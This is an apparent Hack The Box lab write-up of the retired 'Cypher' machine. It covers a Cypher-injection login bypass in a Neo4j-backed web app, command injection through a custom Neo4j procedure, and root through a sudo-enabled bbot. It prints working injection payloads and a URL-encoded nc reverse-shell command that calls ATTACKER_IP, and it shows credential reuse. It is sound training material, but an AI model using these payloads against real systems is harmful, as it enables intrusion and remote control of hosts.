---
title: "🕸️ HTB Cypher Write-up"
name: Cypher
date: 2025-07-26
difficulty: Medium
os: Linux
skills: "Enumeration, Web Fuzzing, Cypher Injection, Session Hijacking, Command Injection, Reverse Shell, Privilege Escalation, Password Reuse, Sudo Privilege Exploitation"
tools: "rustscan, nmap, ffuf, jd-gui, Burp Suite, revshells, nc, sudo, bbot-privesc"
published: true
---

![](images/Pasted%20image%2020250716200525.png)

## 📝 Summary

"Cypher" was an interesting box that blended **web exploitation**, **graph database query injection**, and **privilege escalation through a misconfigured tool**.  

The initial foothold was established through **Cypher Injection** in the login API, which enabled forging a successful login by injecting a crafted query that returned a valid hash.

After gaining access, I discovered custom Neo4j procedures implemented in a Java JAR file, one of which was vulnerable to **command injection**. This gave me a shell as the `neo4j` user.  

From there, password reuse between `neo4j` and `graphasm` enabled SSH access. 
Finally, **a misconfigured `bbot` binary with `sudo` privileges** led to full system compromise.

## 🌐 GRAPH ASM Website

### 🔎 Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 9.6
- `80/tcp`: nginx 1.24.0

```
fcoomans@kali:~/htb/cypher$ rustscan -a 10.10.11.57 --tries 5 --ulimit 10000 -- -sCV -oA cypher_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.57:22
Open 10.10.11.57:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA cypher_tcp_all" on ip 10.10.11.57
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 23:09 SAST

<SNIP>

Nmap scan report for cypher.htb (10.10.11.57)
Host is up, received reset ttl 63 (0.16s latency).
Scanned at 2025-07-16 23:09:42 SAST for 11s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: GRAPH ASM
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `cypher.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/cypher$ grep cypher.htb /etc/hosts
10.10.11.57     cypher.htb
```

Fuzzing uncovered and interesting `/testing` web directory.

```
fcoomans@kali:~/htb/cypher$ ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt:FUZZ -u http://cypher.htb/FUZZ -ic -t 60

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cypher.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api/                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 176ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 201ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 203ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 197ms]
:: Progress: [2565/2565] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

The directory contained a Java JAR file.

```
fcoomans@kali:~/htb/cypher$ curl -s http://cypher.htb/testing/ |html2text
****** Index of /testing/ ******
===============================================================================
../
custom-apoc-extension-1.0-SNAPSHOT.jar             17-Feb-2025 11:49
6556
===============================================================================
```

The JAR file was looted.

```
fcoomans@kali:~/htb/cypher/loot$ curl -s -O http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar

fcoomans@kali:~/htb/cypher/loot$ ls
custom-apoc-extension-1.0-SNAPSHOT.jar
```

And `jd-gui`, a Java Decompiler, was used to look at the procedures in the class files.

![](images/Pasted%20image%2020250716190915.png)

![](images/Pasted%20image%2020250716190931.png)

The website was a graphing site to visualize Attack Surfaces.

![](images/Pasted%20image%2020250716191017.png)

This quote was found in the page source code.  

The line comes from Walt Kowalski in _Gran Torino_, where suffering is portrayed as an unavoidable part of life. But there’s another layer here—_The Matrix_. The box name “Cypher” is a direct nod to the character who chooses ignorant bliss over the harsh truth, betraying his team in the process.

In cybersecurity, ignorance works the same way. Ignoring vulnerabilities may feel comfortable, but that choice often leads to real suffering when attackers exploit the gaps.

```
<!-- "what is the acceptable amount of suffering, is the question." -TheFunky1 -->
```

I attempted to log in with the credentials `admin:admin`.

![](images/Pasted%20image%2020250716191124.png)

And captured the Request and Response with BURP.

![](images/Pasted%20image%2020250716191155.png)

I copied the request to `curl` since the response is shown without any clutter.

```
fcoomans@kali:~/htb/cypher$ curl -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"admin\",\"password\":\"admin\"}" http://cypher.htb/api/auth
{"detail":"Invalid credentials"}
```

#### 💡Cypher queries discovered

Attempting an SQLi with payload `admin'` for the `username` parameter reveals that the site is actually Cypher queries.
This immediately reminded me of the queries in BloodHound, as that program also uses Cypher for its queries.

```
fcoomans@kali:~/htb/cypher$ curl -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"admin'\",\"password\":\"admin\"}" http://cypher.htb/api/auth

Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
                                                            ^}

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
                                                            ^}
```

The interesting part is that the query returns the password hash, possibly to check it later.

```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash
```

Sending the payload `admin' OR true RETURN u.name//`: 
- The first part is similar to `admin' OR 1=1` in SQLi, which will always be true and allow login.
- The second part will return the username and not the password hash as expected.  The payload ends with `//` to comment out the remaining query.

After the injection, the query on the server will look like this:

```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR true RETURN u.name//' return h.value as hash
```

The response shows what I expected;  that the password hash is verified in the `verify_creds` function.  

```
fcoomans@kali:~/htb/cypher$ curl -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"admin' OR true RETURN u.name//\",\"password\":\"admin\"}" http://cypher.htb/api/auth
Traceback (most recent call last):
  File "/app/app.py", line 144, in verify_creds
    db_hash = results[0]["hash"]
KeyError: 'hash'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR true RETURN u.name//' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 144, in verify_creds
    db_hash = results[0]["hash"]
KeyError: 'hash'
```

The cypher query shown also tells me that the password hash is a simple `sha1` hash.

```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR true RETURN u.name//' return h.value as hash
```

### 🧪 Exploitation

#### 💉 Cypher injection

I use `sha1sum` to create a sha1 hash for the word `password`.

```
fcoomans@kali:~/htb/cypher$ echo -n "password" |sha1sum
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  -
```

And then adds this to the injection payload, which will now return the sha1 sum for `password`, which will match the `password` parameter's `password` value and allow the login attempt.

The payload now looks like this:
```cypher
admin' OR true RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //
```

Sending it to the server now returns a session cookie in a `200` response, instead of the `Invalid credentials` or error code messages.  
This means the login was successful.

```
fcoomans@kali:~/htb/cypher$ curl -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"admin' OR true RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //\",\"password\":\"password\"}" http://cypher.htb/api/auth
ok
fcoomans@kali:~/htb/cypher$ curl -v -s -X POST -H 'Content-Type: application/json' --data-binary "{\"username\":\"admin' OR true RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //\",\"password\":\"password\"}" http://cypher.htb/api/auth
* Host cypher.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.57
*   Trying 10.10.11.57:80...
* Connected to cypher.htb (10.10.11.57) port 80
* using HTTP/1.x
> POST /api/auth HTTP/1.1
> Host: cypher.htb
> User-Agent: curl/8.14.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 112
>
* upload completely sent off: 112 bytes
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Wed, 16 Jul 2025 17:24:00 GMT
< Content-Length: 2
< Connection: keep-alive
< set-cookie: access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM; Path=/; SameSite=lax
<
* Connection #0 to host cypher.htb left intact
ok
```

I opened Developer Tools and manually added the cookie to the site cookies.

![](images/Pasted%20image%2020250716192641.png)

### 💰 Post Exploitation

Refreshing the page shows that Cypher queries can now be run on the website.
Selecting the `Select All` query shows the query and the results in JSON and graph format.

![](images/Pasted%20image%2020250716192806.png)

## 🕵️‍♂️ Cypher query procedure command injection

### 🔎 Recon

The traffic is once again intercepted with BURP.

![](images/Pasted%20image%2020250716192846.png)

And then copied to BURP for a clutter-free response evaluation experience.

```
fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM' "http://cypher.htb/api/cypher?query=MATCH%20(n)%20RETURN%20n" |jq |head
[
  {
    "n": {
      "name": "graphasm"
    }
  },
  {
    "n": {
      "value": "9f54ca4c130be6d529a56dee59dc2b2090e43acf"
    }
```

The `SHOW PROCEDURES` query is sent and look at that, the `helloWorld` and `getUrlStatusCode` procedures from the Java JAR file found under `testing` is shown as procedures that I can `CALL` to be run.

```
fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM' "http://cypher.htb/api/cypher?query=SHOW%20PROCEDURES" |jq
[
  {
    "name": "custom.getUrlStatusCode",
    "description": "Returns the HTTP status code for the given URL as a string",
    "mode": "READ",
    "worksOnSystem": false
  },
  {
    "name": "custom.helloWorld",
    "description": "A simple hello world procedure",
    "mode": "READ",
    "worksOnSystem": false
  },
<SNIP>
```

This is confirmed by comparing the `HelloWorldProcedure` name and description as seen in `jd-gui` with the server response.

![](images/Pasted%20image%2020250716193606.png)

I use https://gchq.github.io/CyberChef/ to URL encode the Cypher `CALL` query.  I do this with all subsequent queries, but will show the first encoding here.
The query is to `CALL` the `custom.helloWorld` procedure and send the parameter `'Frans'` to the procedure.

```cypher
CALL custom.helloWorld('Frans')
```

![](images/Pasted%20image%2020250716193846.png)

Sending the URL-encoded query to the server shows the response, which correlates with the source code from the JAR file.

```
fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM' "http://cypher.htb/api/cypher?query=CALL%20custom.helloWorld('Frans')" |jq
[
  {
    "greeting": "Hello, Frans!"
  }
]
```

The `url` parameter from the `custom.getUrlStatusCode` procedure is not sanitized and can be used for command injection.

![](images/Pasted%20image%2020250716194000.png)

### 🧪 Exploitation

To test this, I sent the payload `;id` as the URL parameter value.

```cypher
CALL custom.getUrlStatusCode(';id')
```

As expected, the response is the user id information.

```
fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM' "http://cypher.htb/api/cypher?query=CALL%20custom.getUrlStatusCode(';id')" |jq
[
  {
    "statusCode": "000uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)"
  }
]
```

#### 👣 Foothold as neo4j

I use https://www.revshells.com to generate a `nc mkfifo` reverse shell, which will give me a `bash` shell on the target.
The reverse shell payload is also URL encoded.

![](images/Pasted%20image%2020250716194352.png)

A `nc` listener is started on the attack host,

```
fcoomans@kali:~/htb/cypher$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And the URL Encoded payload `;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%204444%20%3E%2Ftmp%2Ff` is sent to the server.

```
fcoomans@kali:~/htb/cypher$ curl -s -b 'access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbicgT1IgdHJ1ZSBSRVRVUk4gJzViYWE2MWU0YzliOTNmM2YwNjgyMjUwYjZjZjgzMzFiN2VlNjhmZDgnIEFTIGhhc2ggLy8iLCJleHAiOjE3NTI3Mjk4NDB9.0aLQ2TGsW98XtUQBqAAGCmnHMIvy-0uVTPBVpgfXagM' "http://cypher.htb/api/cypher?query=CALL%20custom.getUrlStatusCode(';rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%204444%20%3E%2Ftmp%2Ff')" |jq
```

A reverse shell is immediately caught by the `nc` listener.

```
fcoomans@kali:~/htb/cypher$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.57] 39176
bash: cannot set terminal process group (1438): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$ id
id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```

### 💰 Post Exploitation

#### 🔼 Priv Esc to graphasm

During system enumeration, I find that the `/home/graphasm/bbot_preset.yml` configuration file contains a password for the `neo4j` user.
The password is `cU4btyib.20xtCMCXkBmerhK`.

```
neo4j@cypher:~$ cat /home/graphasm/bbot_preset.yml
cat /home/graphasm/bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

The `/etc/password` file is also checked to get a list of all users that have shell access.
Only the `graphasm` user stands out as its home directory is under `/home`.

```
neo4j@cypher:~$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
```

I attempt to SSH to the target as user `graphasm`, but re-using the password for `neo4j` i.e., `cU4btyib.20xtCMCXkBmerhK` and it works.

```
fcoomans@kali:~/htb/cypher$ ssh graphasm@cypher.htb
graphasm@cypher.htb's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

<SNIP>

graphasm@cypher:~$ id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
```

#### 🚩 user.txt

Graphasm holds the `user.txt` flag.

```
graphasm@cypher:~$ cat /home/graphasm/user.txt
6191afdeef38e3a1c74919f572e39231
```

## 🤖 BBOT

### 🔎 Recon

Graphasm can use `sudo` to run the `bbot` program as `root`.

```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

The `bbot` program version is `v2.1.0.4939rc`.

```
graphasm@cypher:~$ /usr/local/bin/bbot --version
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

v2.1.0.4939rc
```

### 🧪 Exploitation

I find a `bbot` PrivEsc script at https://github.com/Housma/bbot-privesc and create a clone of the repo.

```
fcoomans@kali:~/htb/cypher$ git clone https://github.com/Housma/bbot-privesc.git
Cloning into 'bbot-privesc'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.
```

I copied the exploit files `systeminfo_enum.py` and `preset.yml` to `/dev/shm` on the target.

```
fcoomans@kali:~/htb/cypher/bbot-privesc$ scp systeminfo_enum.py graphasm@cypher.htb:/dev/shm/
graphasm@cypher.htb's password:
systeminfo_enum.py                                                                                                                       100%  523     3.2KB/s   00:00

fcoomans@kali:~/htb/cypher/bbot-privesc$ scp preset.yml graphasm@cypher.htb:/dev/shm/
graphasm@cypher.htb's password:
preset.yml                                                                                                                               100%   83     0.5KB/s   00:00
```

`bbot` is run with `sudo` and passing in the malicious `preset.yml` file.  This dumps me into a root shell.

```
graphasm@cypher:/dev/shm$ sudo /usr/local/bin/bbot -t dummy.com -p ./preset.yml --event-types ROOT
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Scan with 1 modules seeded with 1 targets (1 in whitelist)
[INFO] Loaded 1/1 scan modules (systeminfo_enum)
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[SUCC] systeminfo_enum: 📡 systeminfo_enum setup called — launching shell!
                                                                          root@cypher:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation

#### 🏆 root.txt

`root` is the holder of the `root.txt` flag.

```
root@cypher:/dev/shm# cat /root/root.txt
060c7a718b6723d73e6d2ac728f68802
```

Turns out Cypher wasn’t very good at keeping secrets… but I was Neo enough to break the Matrix.

And `Cypher has been Pwned!` 🎉

![](images/Pasted%20image%2020250716200339.png)

## 📚 Lessons Learned

- **Query Injection Risks Go Beyond SQL**  
    Cypher Injection works on Neo4j just like SQLi works on relational databases. Any user-controlled input concatenated into queries is dangerous.
- **Custom Procedures = Custom Attack Surface**  
    When developers add custom Neo4j procedures (via APOC extensions), they need proper input validation. Otherwise, features like `getUrlStatusCode` can easily lead to RCE.
- **Password Reuse Still Hurts**  
    Credential reuse between service accounts (`neo4j`) and system users (`graphasm`) opened the door for lateral movement.
- **Sudo Misconfiguration Can End It All**  
    Allowing a user to run `bbot` as root without a password was game over. Misconfigured automation or security tools with elevated privileges remain a common escalation vector.
- **Enumeration and Reading Source Code Pay Off**  
    Every clue—from error messages to JAR decompilation—was a stepping stone to the root flag.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
